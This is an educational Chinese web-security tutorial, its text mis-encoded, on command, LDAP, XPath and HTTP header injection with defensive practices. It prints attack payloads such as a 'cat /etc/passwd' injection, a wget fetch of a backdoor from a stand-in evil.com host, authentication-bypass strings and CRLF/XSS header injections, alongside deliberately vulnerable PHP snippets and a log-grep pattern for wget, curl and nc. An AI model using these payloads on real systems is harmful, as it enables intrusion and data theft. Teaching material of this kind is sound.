---
title: 4ã€å…¶ä»–æ³¨å…¥æ”»å‡»ç±»å‹
---
## ğŸ“š ç›®å½•

1. [æ³¨å…¥æ”»å‡»æ¦‚è¿°](#1-æ³¨å…¥æ”»å‡»æ¦‚è¿°)
2. [å‘½ä»¤æ³¨å…¥ä¸ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ](#2-å‘½ä»¤æ³¨å…¥ä¸ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ)
3. [LDAPæ³¨å…¥æ”»å‡»æŠ€æœ¯](#3-LDAPæ³¨å…¥æ”»å‡»æŠ€æœ¯)
4. [XPathæ³¨å…¥æ¼æ´](#4-XPathæ³¨å…¥æ¼æ´)
5. [Headeræ³¨å…¥ä¸HTTPå“åº”åˆ†å‰²](#5-Headeræ³¨å…¥ä¸HTTPå“åº”åˆ†å‰²)
6. [ä»£ç æ³¨å…¥é˜²æŠ¤æœ€ä½³å®è·µ](#6-ä»£ç æ³¨å…¥é˜²æŠ¤æœ€ä½³å®è·µ)
7. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#7-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ¯ æ³¨å…¥æ”»å‡»æ¦‚è¿°


### 1.1 ä»€ä¹ˆæ˜¯æ³¨å…¥æ”»å‡»


**ğŸ’¡ é€šä¿—ç†è§£**
æƒ³è±¡ä½ åœ¨ä¸€å®¶é¤å…ç‚¹èœï¼Œæ­£å¸¸æƒ…å†µä¸‹ä½ ä¼šè¯´"æˆ‘è¦ä¸€ä»½å®«ä¿é¸¡ä¸"ã€‚ä½†å¦‚æœæœåŠ¡å‘˜ç›´æ¥æŠŠä½ è¯´çš„è¯ä¼ ç»™å¨å¸ˆï¼Œè€Œä½ è¯´æˆäº†"æˆ‘è¦ä¸€ä»½å®«ä¿é¸¡ä¸ï¼Œé¡ºä¾¿æŠŠå¨æˆ¿çš„é’±æ‹¿ç»™æˆ‘"ï¼Œå¨å¸ˆå¦‚æœç…§åšï¼Œé‚£å°±å‡ºé—®é¢˜äº†ã€‚

æ³¨å…¥æ”»å‡»å°±æ˜¯è¿™æ · - **æ”»å‡»è€…åœ¨æ­£å¸¸è¾“å…¥ä¸­æ··å…¥æ¶æ„æŒ‡ä»¤**ï¼Œè®©ç³»ç»Ÿè¯¯ä»¥ä¸ºè¿™äº›æ¶æ„æŒ‡ä»¤æ˜¯æ­£å¸¸æ“ä½œçš„ä¸€éƒ¨åˆ†ã€‚

### 1.2 æ³¨å…¥æ”»å‡»çš„æ ¸å¿ƒåŸç†


```
æ­£å¸¸æµç¨‹ï¼šç”¨æˆ·è¾“å…¥ â†’ ç¨‹åºå¤„ç† â†’ ç³»ç»Ÿæ‰§è¡Œ â†’ è¿”å›ç»“æœ
æ³¨å…¥æ”»å‡»ï¼šæ¶æ„è¾“å…¥ â†’ ç¨‹åºè¯¯å¤„ç† â†’ ç³»ç»Ÿæ‰§è¡Œæ¶æ„æŒ‡ä»¤ â†’ æ³„éœ²ä¿¡æ¯/é€ æˆç ´å
```

**ğŸ” å…³é”®é—®é¢˜**ï¼šç¨‹åºæ²¡æœ‰åŒºåˆ†"æ•°æ®"å’Œ"æŒ‡ä»¤"

### 1.3 å¸¸è§æ³¨å…¥æ”»å‡»ç±»å‹å¯¹æ¯”


| æ”»å‡»ç±»å‹ | **æ”»å‡»ç›®æ ‡** | **æ³¨å…¥å†…å®¹** | **å±å®³ç­‰çº§** |
|---------|------------|-------------|-------------|
| **SQLæ³¨å…¥** | `æ•°æ®åº“` | `SQLè¯­å¥` | `ğŸ”´ æé«˜` |
| **å‘½ä»¤æ³¨å…¥** | `æ“ä½œç³»ç»Ÿ` | `ç³»ç»Ÿå‘½ä»¤` | `ğŸ”´ æé«˜` |
| **XPathæ³¨å…¥** | `XMLæ•°æ®` | `XPathæŸ¥è¯¢` | `ğŸŸ¡ ä¸­ç­‰` |
| **LDAPæ³¨å…¥** | `ç›®å½•æœåŠ¡` | `LDAPæŸ¥è¯¢` | `ğŸŸ¡ ä¸­ç­‰` |
| **Headeræ³¨å…¥** | `HTTPåè®®` | `HTTPå¤´éƒ¨` | `ğŸŸ  è¾ƒé«˜` |

---

## 2. âš¡ å‘½ä»¤æ³¨å…¥ä¸ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ


### 2.1 ä»€ä¹ˆæ˜¯å‘½ä»¤æ³¨å…¥


**ğŸ’¡ ç®€å•ç†è§£**
å‘½ä»¤æ³¨å…¥å°±æ˜¯è®©ç½‘ç«™ç¨‹åºå¸®ä½ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å°±åƒä½ åœ¨è‡ªå·±ç”µè„‘ä¸Šæ‰“å¼€å‘½ä»¤è¡Œè¾“å…¥æŒ‡ä»¤ä¸€æ ·ï¼Œä½†è¿™æ¬¡æ˜¯åœ¨åˆ«äººçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**ğŸ¯ æ”»å‡»åŸç†**
ç½‘ç«™ç¨‹åºåœ¨åå°è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨äº†ç”¨æˆ·è¾“å…¥ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ·»åŠ é¢å¤–çš„å‘½ä»¤ã€‚

### 2.2 å‘½ä»¤æ³¨å…¥çš„å·¥ä½œæœºåˆ¶


**ğŸ“‹ æ­£å¸¸æƒ…å†µ**
```php
// ç½‘ç«™åŠŸèƒ½ï¼šæŸ¥çœ‹æ–‡ä»¶å†…å®¹
$filename = $_GET['file'];
$output = shell_exec("cat /var/www/files/" . $filename);
echo $output;

// ç”¨æˆ·æ­£å¸¸è®¿é—®ï¼šsite.com/view.php?file=readme.txt
// å®é™…æ‰§è¡Œï¼šcat /var/www/files/readme.txt
```

**âš ï¸ æ”»å‡»æƒ…å†µ**
```php
// æ”»å‡»è€…è®¿é—®ï¼šsite.com/view.php?file=readme.txt; ls -la
// å®é™…æ‰§è¡Œï¼šcat /var/www/files/readme.txt; ls -la
//          â†‘ æ­£å¸¸å‘½ä»¤              â†‘ æ¶æ„æ·»åŠ çš„å‘½ä»¤
```

### 2.3 å¸¸ç”¨çš„å‘½ä»¤æ³¨å…¥æŠ€å·§


**ğŸ”§ å‘½ä»¤è¿æ¥ç¬¦**
```
ç¬¦å·    ä½œç”¨                    ç¤ºä¾‹
;       é¡ºåºæ‰§è¡Œå¤šä¸ªå‘½ä»¤        cmd1; cmd2
&&      å‰ä¸€ä¸ªæˆåŠŸæ‰æ‰§è¡Œåä¸€ä¸ª   cmd1 && cmd2  
||      å‰ä¸€ä¸ªå¤±è´¥æ‰æ‰§è¡Œåä¸€ä¸ª   cmd1 || cmd2
|       ç®¡é“ï¼Œä¼ é€’è¾“å‡º          cmd1 | cmd2
&       åå°æ‰§è¡Œ               cmd1 & cmd2
```

**ğŸ’» å®é™…æ”»å‡»ç¤ºä¾‹**
```bash
# æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯
åŸå§‹ï¼šping google.com
æ³¨å…¥ï¼šping google.com; uname -a

# æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶
åŸå§‹ï¼šcat log.txt
æ³¨å…¥ï¼šcat log.txt; cat /etc/passwd

# ä¸‹è½½åé—¨
åŸå§‹ï¼šwget file.zip
æ³¨å…¥ï¼šwget file.zip; wget http://evil.com/backdoor.php
```

### 2.4 å‘½ä»¤æ³¨å…¥çš„å±å®³


**ğŸ”´ ç³»ç»Ÿæ§åˆ¶**
- æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤
- æŸ¥çœ‹ã€ä¿®æ”¹ã€åˆ é™¤æ–‡ä»¶
- å®‰è£…åé—¨ç¨‹åº

**ğŸ“ ä¿¡æ¯æ³„éœ²**
```bash
# æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·
cat /etc/passwd

# æŸ¥çœ‹ç³»ç»Ÿé…ç½®
cat /etc/hosts
ps aux  # æŸ¥çœ‹è¿è¡Œè¿›ç¨‹

# æŸ¥çœ‹ç½‘ç«™æºç 
find /var/www -name "*.php" | head -10
```

### 2.5 å‘½ä»¤æ³¨å…¥çš„æ£€æµ‹æ–¹æ³•


**ğŸ” æ‰‹å·¥æµ‹è¯•**
```
åŸºç¡€æµ‹è¯•ï¼š
; whoami
; id
; pwd
; ls

æ—¶é—´å»¶è¿Ÿæµ‹è¯•ï¼š
; sleep 10
; ping -c 10 127.0.0.1

è¾“å‡ºé‡å®šå‘ï¼š
; whoami > /tmp/test.txt
```

**ğŸ› ï¸ è‡ªåŠ¨åŒ–å·¥å…·**
- **Commix**ï¼šä¸“é—¨çš„å‘½ä»¤æ³¨å…¥æµ‹è¯•å·¥å…·
- **Burp Suite**ï¼šWebå®‰å…¨æµ‹è¯•å¹³å°
- **OWASP ZAP**ï¼šå¼€æºå®‰å…¨æ‰«æå™¨

---

## 3. ğŸ¢ LDAPæ³¨å…¥æ”»å‡»æŠ€æœ¯


### 3.1 ä»€ä¹ˆæ˜¯LDAP


**ğŸ’¡ é€šä¿—è§£é‡Š**
LDAPå°±åƒæ˜¯å…¬å¸çš„ç”µè¯ç°¿æˆ–é€šè®¯å½•ã€‚å®ƒå­˜å‚¨äº†å‘˜å·¥ä¿¡æ¯ã€éƒ¨é—¨ç»“æ„ã€æƒé™é…ç½®ç­‰ã€‚ä¼ä¸šç»å¸¸ç”¨å®ƒæ¥ç®¡ç†ç”¨æˆ·ç™»å½•å’Œæƒé™ã€‚

**ğŸ“– LDAPåŸºç¡€çŸ¥è¯†**
- **å…¨ç§°**ï¼šLightweight Directory Access Protocolï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰
- **ç”¨é€”**ï¼šå­˜å‚¨å’ŒæŸ¥è¯¢ç›®å½•ä¿¡æ¯ï¼ˆç”¨æˆ·ã€ç»„ç»‡ã€æƒé™ç­‰ï¼‰
- **å¸¸è§åº”ç”¨**ï¼šä¼ä¸šèº«ä»½è®¤è¯ã€Active Directory

### 3.2 LDAPæŸ¥è¯¢è¯­æ³•åŸºç¡€


**ğŸ“ LDAPæŸ¥è¯¢ç»“æ„**
```
(å±æ€§=å€¼)           # åŸºæœ¬æŸ¥è¯¢
(&(æ¡ä»¶1)(æ¡ä»¶2))   # ANDæ“ä½œ
(|(æ¡ä»¶1)(æ¡ä»¶2))   # ORæ“ä½œ
(!(æ¡ä»¶))          # NOTæ“ä½œ
```

**ğŸ¯ å®é™…ä¾‹å­**
```ldap
# æŸ¥æ‰¾ç”¨æˆ·åä¸ºjohnçš„ç”¨æˆ·
(uid=john)

# æŸ¥æ‰¾ç®¡ç†å‘˜ç»„çš„æ‰€æœ‰æˆå‘˜
(&(objectClass=person)(memberOf=cn=admins,dc=company,dc=com))

# æŸ¥æ‰¾å§“å¼ æˆ–å§“æçš„ç”¨æˆ·
(|(sn=å¼ )(sn=æ))
```

### 3.3 LDAPæ³¨å…¥æ”»å‡»åŸç†


**ğŸ” æ¼æ´åœºæ™¯**
ç½‘ç«™ç™»å½•éªŒè¯æ—¶ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°LDAPæŸ¥è¯¢ä¸­ï¼š

```php
// æ­£å¸¸ç™»å½•éªŒè¯
$username = $_POST['username'];
$password = $_POST['password'];

$query = "(&(uid=" . $username . ")(userPassword=" . $password . "))";
// æ­£å¸¸æŸ¥è¯¢ï¼š(&(uid=john)(userPassword=123456))
```

**âš ï¸ æ”»å‡»ç¤ºä¾‹**
```php
// æ”»å‡»è€…è¾“å…¥ç”¨æˆ·åï¼šadmin)(|(uid=*
// ç”Ÿæˆçš„æŸ¥è¯¢ï¼š(&(uid=admin)(|(uid=*)(userPassword=whatever))
//            â†‘ è¿™é‡ŒæŸ¥è¯¢é€»è¾‘è¢«ç ´åäº†
```

### 3.4 å¸¸è§LDAPæ³¨å…¥æŠ€å·§


**ğŸ­ ç»•è¿‡èº«ä»½éªŒè¯**
```ldap
# è¾“å…¥ç”¨æˆ·åï¼šadmin)(&(1=1
# ç”ŸæˆæŸ¥è¯¢ï¼š(&(uid=admin)(&(1=1)(userPassword=123))
# ç»“æœï¼šæ°¸è¿œè¿”å›trueï¼Œç»•è¿‡å¯†ç éªŒè¯

# è¾“å…¥ç”¨æˆ·åï¼š*)(uid=*))(|(uid=*
# ç”ŸæˆæŸ¥è¯¢ï¼š(&(uid=*)(uid=*))(|(uid=*)(userPassword=123))
# ç»“æœï¼šæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·
```

**ğŸ“Š ä¿¡æ¯æšä¸¾**
```ldap
# æšä¸¾ç”¨æˆ·å
è¾“å…¥ï¼š*)(uid=admin
ç»“æœï¼šå¦‚æœadminç”¨æˆ·å­˜åœ¨ï¼ŒæŸ¥è¯¢æˆåŠŸ

# æšä¸¾å±æ€§
è¾“å…¥ï¼š*)(mail=*
ç»“æœï¼šæŸ¥æ‰¾æ‰€æœ‰æœ‰é‚®ç®±çš„ç”¨æˆ·
```

### 3.5 LDAPæ³¨å…¥é˜²æŠ¤


**âœ… è¾“å…¥éªŒè¯**
```php
// ç™½åå•éªŒè¯
function validateUsername($username) {
    return preg_match('/^[a-zA-Z0-9_]+$/', $username);
}
```

**ğŸ›¡ï¸ å‚æ•°åŒ–æŸ¥è¯¢**
```java
// Java LDAPå®‰å…¨æŸ¥è¯¢ç¤ºä¾‹
String filter = "(&(uid={0})(userPassword={1}))";
SearchControls searchControls = new SearchControls();
NamingEnumeration results = ctx.search("dc=company,dc=com", 
    filter, new Object[]{username, password}, searchControls);
```

---

## 4. ğŸ“„ XPathæ³¨å…¥æ¼æ´


### 4.1 ä»€ä¹ˆæ˜¯XPath


**ğŸ’¡ ç®€å•ç†è§£**
XPathå°±åƒæ˜¯XMLæ–‡ä»¶çš„"æŸ¥æ‰¾å·¥å…·"ã€‚å¦‚æœæŠŠXMLæƒ³è±¡æˆä¸€æœ¬ä¹¦ï¼ŒXPathå°±æ˜¯å‘Šè¯‰ä½ "åœ¨ç¬¬3ç« ç¬¬2èŠ‚æ‰¾åŒ…å«'å®‰å…¨'è¿™ä¸ªè¯çš„æ®µè½"ã€‚

**ğŸ“– XPathåŸºç¡€**
- **å…¨ç§°**ï¼šXML Path Language
- **ç”¨é€”**ï¼šåœ¨XMLæ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯
- **è¯­æ³•**ï¼šç±»ä¼¼æ–‡ä»¶è·¯å¾„çš„æŸ¥æ‰¾æ–¹å¼

### 4.2 XPathæŸ¥è¯¢è¯­æ³•


**ğŸ“ åŸºæœ¬è¯­æ³•**
```xpath
/bookstore/book[1]           # ç¬¬ä¸€æœ¬ä¹¦
//book[@price<10]            # ä»·æ ¼å°äº10çš„ä¹¦
//book[author='å¼ ä¸‰']         # ä½œè€…æ˜¯å¼ ä¸‰çš„ä¹¦
//book[position()>1]         # é™¤ç¬¬ä¸€æœ¬å¤–çš„æ‰€æœ‰ä¹¦
```

**ğŸ¯ å®é™…XMLç¤ºä¾‹**
```xml
<users>
    <user id="1">
        <username>admin</username>
        <password>123456</password>
        <role>administrator</role>
    </user>
    <user id="2">
        <username>guest</username>
        <password>guest123</password>
        <role>user</role>
    </user>
</users>
```

### 4.3 XPathæ³¨å…¥æ”»å‡»åŸç†


**ğŸ” æ¼æ´åœºæ™¯**
ç½‘ç«™ä½¿ç”¨XMLå­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼Œç™»å½•æ—¶ç”¨XPathæŸ¥è¯¢ï¼š

```php
// æ­£å¸¸ç™»å½•éªŒè¯
$username = $_POST['username'];
$password = $_POST['password'];

$xpath = "//user[username='" . $username . "' and password='" . $password . "']";
// æ­£å¸¸æŸ¥è¯¢ï¼š//user[username='admin' and password='123456']
```

**âš ï¸ æ”»å‡»ç¤ºä¾‹**
```php
// æ”»å‡»è€…è¾“å…¥ç”¨æˆ·åï¼šadmin' or '1'='1
// ç”ŸæˆæŸ¥è¯¢ï¼š//user[username='admin' or '1'='1' and password='123456']
// ç»“æœï¼š'1'='1'æ°¸è¿œä¸ºçœŸï¼Œç»•è¿‡å¯†ç éªŒè¯
```

### 4.4 XPathæ³¨å…¥æ”»å‡»æŠ€å·§


**ğŸ­ ç»•è¿‡è®¤è¯**
```xpath
# è¾“å…¥ç”¨æˆ·åï¼š' or 1=1 or 'a'='a
# æŸ¥è¯¢ï¼š//user[username='' or 1=1 or 'a'='a' and password='123']
# ç»“æœï¼šè¿”å›æ‰€æœ‰ç”¨æˆ·

# è¾“å…¥å¯†ç ï¼š' or //user[username='admin']/*[1]='admin
# æšä¸¾ç”¨æˆ·ä¿¡æ¯
```

**ğŸ“Š ç›²æ³¨æŠ€å·§**
```xpath
# åˆ¤æ–­èŠ‚ç‚¹å­˜åœ¨
' or count(//user)>0 or 'a'='b

# æšä¸¾ç”¨æˆ·æ•°é‡
' or count(//user)>5 or 'a'='b

# æšä¸¾ç”¨æˆ·åé•¿åº¦
' or string-length(//user[1]/username)>5 or 'a'='b
```

### 4.5 XPathæ³¨å…¥é˜²æŠ¤


**âœ… å‚æ•°åŒ–æŸ¥è¯¢**
```java
// Javaå®‰å…¨ç¤ºä¾‹
XPathExpression expr = xpath.compile("//user[username=$username and password=$password]");
expr.setXPathVariableResolver(new SimpleVariableResolver("username", inputUsername));
expr.setXPathVariableResolver(new SimpleVariableResolver("password", inputPassword));
```

---

## 5. ğŸŒ Headeræ³¨å…¥ä¸HTTPå“åº”åˆ†å‰²


### 5.1 ä»€ä¹ˆæ˜¯Headeræ³¨å…¥


**ğŸ’¡ é€šä¿—ç†è§£**
HTTPè¯·æ±‚å°±åƒå¯„ä¿¡ï¼Œä¿¡å°ä¸Šæœ‰æ”¶ä»¶äººåœ°å€ã€å¯„ä»¶äººåœ°å€ç­‰ä¿¡æ¯ï¼Œè¿™äº›å°±æ˜¯"Header"ã€‚Headeræ³¨å…¥å°±æ˜¯åœ¨è¿™äº›åœ°å€ä¿¡æ¯é‡ŒåŠ å…¥å‡ä¿¡æ¯ï¼Œè®©é‚®å±€ï¼ˆæœåŠ¡å™¨ï¼‰åšé”™è¯¯çš„å¤„ç†ã€‚

**ğŸ“¨ HTTP HeaderåŸºç¡€**
```
HTTPè¯·æ±‚ç¤ºä¾‹ï¼š
GET /page.php HTTP/1.1
Host: www.example.com          â† Headerå­—æ®µ
User-Agent: Mozilla/5.0...     â† Headerå­—æ®µ  
Cookie: sessionid=abc123       â† Headerå­—æ®µ
Content-Type: text/html        â† Headerå­—æ®µ
```

### 5.2 Headeræ³¨å…¥æ”»å‡»åŸç†


**ğŸ” æ¼æ´åœºæ™¯**
ç½‘ç«™åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶ï¼Œç›´æ¥å°†å…¶æ”¾å…¥HTTPå“åº”å¤´ä¸­ï¼š

```php
// å±é™©ä»£ç ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥è®¾ç½®Header
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);

// æ­£å¸¸ä½¿ç”¨ï¼šsite.com/redirect.php?url=https://google.com
// å“åº”å¤´ï¼šLocation: https://google.com
```

**âš ï¸ æ”»å‡»ç¤ºä¾‹**
```php
// æ”»å‡»è¾“å…¥ï¼šhttps://evil.com%0d%0aSet-Cookie: admin=true
// %0d%0aæ˜¯å›è½¦æ¢è¡Œç¬¦ï¼ˆ\r\nï¼‰

// å®é™…å“åº”å¤´ï¼š
// Location: https://evil.com
// Set-Cookie: admin=true    â† æ”»å‡»è€…æ³¨å…¥çš„æ¶æ„Header
```

### 5.3 HTTPå“åº”åˆ†å‰²æ”»å‡»


**ğŸ“‹ æ”»å‡»åŸç†å›¾ç¤º**
```
æ­£å¸¸å“åº”ï¼š
HTTP/1.1 302 Found
Location: https://google.com
Content-Type: text/html

<html>æ­£å¸¸é¡µé¢å†…å®¹</html>

åˆ†å‰²æ”»å‡»åï¼š
HTTP/1.1 302 Found  
Location: https://evil.com
Set-Cookie: admin=true        â† æ³¨å…¥çš„æ¶æ„Header
Content-Type: text/html

<script>alert('XSS')</script> â† æ³¨å…¥çš„æ¶æ„å†…å®¹
<html>æ­£å¸¸é¡µé¢å†…å®¹</html>
```

### 5.4 Headeræ³¨å…¥çš„å±å®³


**ğŸª Cookieæ³¨å…¥**
```
æ³¨å…¥ï¼š%0d%0aSet-Cookie: admin=true
æ•ˆæœï¼šç»™ç”¨æˆ·è®¾ç½®ç®¡ç†å‘˜æƒé™Cookie
```

**ğŸ“„ å†…å®¹æ³¨å…¥**
```
æ³¨å…¥ï¼š%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert('XSS')</script>
æ•ˆæœï¼šåœ¨å“åº”ä¸­æ³¨å…¥æ¶æ„JavaScriptä»£ç 
```

**ğŸ”„ ç¼“å­˜æ±¡æŸ“**
```
æ³¨å…¥ï¼š%0d%0aCache-Control: public, max-age=31536000
æ•ˆæœï¼šè®©ä»£ç†æœåŠ¡å™¨ç¼“å­˜æ¶æ„å†…å®¹
```

### 5.5 Headeræ³¨å…¥é˜²æŠ¤


**âœ… è¾“å…¥éªŒè¯**
```php
// éªŒè¯URLæ ¼å¼
function validateURL($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

// ç§»é™¤æ¢è¡Œç¬¦
function sanitizeHeader($value) {
    return str_replace(["\r", "\n"], '', $value);
}
```

**ğŸ›¡ï¸ å®‰å…¨ç¼–ç¨‹**
```php
// ä½¿ç”¨ç™½åå•
$allowed_domains = ['google.com', 'example.com'];
$parsed_url = parse_url($_GET['url']);
if (in_array($parsed_url['host'], $allowed_domains)) {
    header("Location: " . $_GET['url']);
}
```

---

## 6. ğŸ›¡ï¸ ä»£ç æ³¨å…¥é˜²æŠ¤æœ€ä½³å®è·µ


### 6.1 é€šç”¨é˜²æŠ¤åŸåˆ™


**ğŸ¯ æ ¸å¿ƒæ€æƒ³ï¼šæ°¸è¿œä¸è¦ä¿¡ä»»ç”¨æˆ·è¾“å…¥**

```
é˜²æŠ¤å±‚æ¬¡ï¼š
1. è¾“å…¥éªŒè¯    â† ç¬¬ä¸€é“é˜²çº¿
2. è¾“å‡ºç¼–ç     â† ç¬¬äºŒé“é˜²çº¿  
3. å‚æ•°åŒ–æŸ¥è¯¢  â† ç¬¬ä¸‰é“é˜²çº¿
4. æœ€å°æƒé™    â† ç¬¬å››é“é˜²çº¿
```

### 6.2 è¾“å…¥éªŒè¯æœ€ä½³å®è·µ


**âœ… ç™½åå•éªŒè¯**
```php
// æ¨èï¼šç™½åå•éªŒè¯
function validateInput($input, $type) {
    switch($type) {
        case 'filename':
            return preg_match('/^[a-zA-Z0-9._-]+$/', $input);
        case 'email':
            return filter_var($input, FILTER_VALIDATE_EMAIL);
        case 'number':
            return is_numeric($input);
        default:
            return false;
    }
}
```

**âŒ é»‘åå•éªŒè¯ï¼ˆä¸æ¨èï¼‰**
```php
// é—®é¢˜ï¼šå®¹æ˜“è¢«ç»•è¿‡
function badValidation($input) {
    $blacklist = [';', '&&', '||', '|'];
    foreach($blacklist as $bad) {
        if (strpos($input, $bad) !== false) {
            return false;
        }
    }
    return true;
}
// æ”»å‡»è€…å¯ä»¥ç”¨å…¶ä»–ç¬¦å·ç»•è¿‡ï¼š%0aï¼ˆæ¢è¡Œç¬¦ï¼‰ç­‰
```

### 6.3 å®‰å…¨ç¼–ç¨‹è§„èŒƒ


**ğŸ”§ ä½¿ç”¨å®‰å…¨å‡½æ•°**
```php
// å‘½ä»¤æ‰§è¡Œ - ä½¿ç”¨escapeshellarg()
$filename = escapeshellarg($_GET['file']);
$output = shell_exec("cat /var/www/files/" . $filename);

// SQLæŸ¥è¯¢ - ä½¿ç”¨é¢„å¤„ç†è¯­å¥
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// æ–‡ä»¶æ“ä½œ - ä½¿ç”¨basename()
$filename = basename($_GET['file']); // ç§»é™¤è·¯å¾„ä¿¡æ¯
```

**ğŸš« é¿å…å±é™©å‡½æ•°**
```php
// å±é™©å‡½æ•°åˆ—è¡¨
eval()          // ä»£ç æ‰§è¡Œ
exec()          // å‘½ä»¤æ‰§è¡Œ
system()        // å‘½ä»¤æ‰§è¡Œ  
shell_exec()    // å‘½ä»¤æ‰§è¡Œ
passthru()      // å‘½ä»¤æ‰§è¡Œ
file_get_contents() // æ–‡ä»¶è¯»å–ï¼ˆå°å¿ƒè¿œç¨‹æ–‡ä»¶ï¼‰
```

### 6.4 ç¯å¢ƒå®‰å…¨é…ç½®


**âš™ï¸ ç³»ç»Ÿæƒé™æ§åˆ¶**
```bash
# WebæœåŠ¡å™¨ç”¨æˆ·æƒé™æœ€å°åŒ–
useradd -r -s /bin/false www-data
chown -R www-data:www-data /var/www
chmod -R 750 /var/www

# ç¦ç”¨å±é™©å‘½ä»¤
chmod 000 /bin/wget
chmod 000 /usr/bin/curl
```

**ğŸ”’ åº”ç”¨é…ç½®**
```php
// PHPå®‰å…¨é…ç½®
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
allow_url_fopen = Off
allow_url_include = Off
```

### 6.5 ç›‘æ§ä¸æ£€æµ‹


**ğŸ“Š æ—¥å¿—ç›‘æ§**
```bash
# ç›‘æ§å¯ç–‘å‘½ä»¤æ‰§è¡Œ
grep -i "wget\|curl\|nc\|bash" /var/log/apache2/access.log

# ç›‘æ§å¼‚å¸¸æ–‡ä»¶è®¿é—®
grep "../../" /var/log/apache2/access.log

# ç›‘æ§SQLæ³¨å…¥å°è¯•
grep -i "union\|select\|insert\|delete" /var/log/apache2/access.log
```

**ğŸš¨ å®æ—¶é˜²æŠ¤**
```bash
# ä½¿ç”¨Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰
ModSecurityè§„åˆ™ç¤ºä¾‹ï¼š
SecRule ARGS "@detectSQLi" \
    "id:1001,phase:2,block,msg:'SQL Injection Attack'"

SecRule ARGS "@detectXSS" \
    "id:1002,phase:2,block,msg:'XSS Attack'"
```

---

## 7. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 7.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ


```
ğŸ”¸ æ³¨å…¥æ”»å‡»æœ¬è´¨ï¼šæ··æ·†æ•°æ®ä¸æŒ‡ä»¤ï¼Œè®©ç³»ç»Ÿæ‰§è¡Œæ¶æ„æ“ä½œ
ğŸ”¸ å‘½ä»¤æ³¨å…¥ï¼šåœ¨ç³»ç»Ÿå‘½ä»¤ä¸­æ³¨å…¥æ¶æ„æŒ‡ä»¤ï¼Œè·å–æœåŠ¡å™¨æ§åˆ¶æƒ
ğŸ”¸ LDAPæ³¨å…¥ï¼šåœ¨ç›®å½•æŸ¥è¯¢ä¸­æ³¨å…¥æ¶æ„æ¡ä»¶ï¼Œç»•è¿‡èº«ä»½è®¤è¯
ğŸ”¸ XPathæ³¨å…¥ï¼šåœ¨XMLæŸ¥è¯¢ä¸­æ³¨å…¥æ¶æ„é€»è¾‘ï¼Œæ³„éœ²æ•æ„Ÿä¿¡æ¯  
ğŸ”¸ Headeræ³¨å…¥ï¼šåœ¨HTTPå¤´éƒ¨æ³¨å…¥æ¶æ„å†…å®¹ï¼Œå®ç°å¤šç§æ”»å‡»
```

### 7.2 å…³é”®é˜²æŠ¤è¦ç‚¹


**ğŸ›¡ï¸ é˜²æŠ¤ç­–ç•¥**
```
è¾“å…¥éªŒè¯ï¼š
- ä½¿ç”¨ç™½åå•éªŒè¯ï¼Œæ‹’ç»é»‘åå•æ€ç»´
- éªŒè¯æ•°æ®ç±»å‹ã€é•¿åº¦ã€æ ¼å¼
- å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰æˆ–è¿‡æ»¤

å®‰å…¨ç¼–ç¨‹ï¼š
- ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢/é¢„å¤„ç†è¯­å¥
- é¿å…ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥
- ä½¿ç”¨å®‰å…¨çš„APIå‡½æ•°

æƒé™æ§åˆ¶ï¼š
- åº”ç”¨æœ€å°æƒé™åŸåˆ™
- é™åˆ¶ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæƒé™
- åˆ†ç¦»ä¸åŒåŠŸèƒ½çš„æƒé™
```

### 7.3 å®é™…åº”ç”¨æŒ‡å¯¼


**ğŸ” å®‰å…¨æµ‹è¯•è¦ç‚¹**
- æ‰‹å·¥æµ‹è¯•ï¼šå°è¯•å„ç§æ³¨å…¥å­—ç¬¦å’Œç»„åˆ
- è‡ªåŠ¨åŒ–æ‰«æï¼šä½¿ç”¨ä¸“ä¸šå®‰å…¨å·¥å…·
- ä»£ç å®¡è®¡ï¼šæ£€æŸ¥è¾“å…¥å¤„ç†å’Œè¾“å‡ºç”Ÿæˆé€»è¾‘
- æ¸—é€æµ‹è¯•ï¼šæ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯

**âš ï¸ å¸¸è§è¯¯åŒº**
```
âŒ åªå…³æ³¨SQLæ³¨å…¥ï¼Œå¿½è§†å…¶ä»–æ³¨å…¥ç±»å‹
âŒ ä¾èµ–é»‘åå•è¿‡æ»¤ï¼Œå®¹æ˜“è¢«ç»•è¿‡
âŒ åªåœ¨å‰ç«¯éªŒè¯ï¼Œåç«¯ç¼ºå°‘éªŒè¯
âŒ è®¤ä¸ºæ¡†æ¶è‡ªåŠ¨é˜²æŠ¤ï¼Œä¸åšé¢å¤–æ£€æŸ¥
```

